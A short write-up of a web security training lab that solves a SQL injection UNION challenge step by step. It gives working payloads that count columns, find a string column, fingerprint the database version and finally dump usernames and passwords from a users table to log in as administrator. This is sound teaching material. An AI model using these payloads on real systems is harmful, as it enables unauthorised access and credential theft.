# SQL injection UNION attack, retrieving multiple values in a single column
- SQL injection vulnerability in the product category filter.
- use a UNION attack to retrieve data from other tables.
- The database contains a different table called users, with columns called username and password.
# Goal
- To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
# Solving The lab
- finding number of columns
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
- after trying payloads we fnd that db has 2 columns
- now to determining datatypes of columns or which columns has string datatype
```
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```
- second payload works and the second column is the string datatype
- now to ouput data from columns we cna use 2 methods first one is to ouput each column alone and second method is to concatenate the results
- first we need to determine db version to procced with the concatenation
- we try differnet payloads
```
' UNION SELECT NULL,@@version--   Microsoft/MYSQL
' UNION SELECT NULL,version()--   PostgreSQL
```
- the second payload works and its a postgresql db
- postgresql ways of concatenation
```
'foo'||'bar'
```
- so final payload built from lab description and postgresql conctatination
```
' UNION select NULL, username || '*' || password from users--
```
- we got the username and password creds we login with administartor and we solved the lab
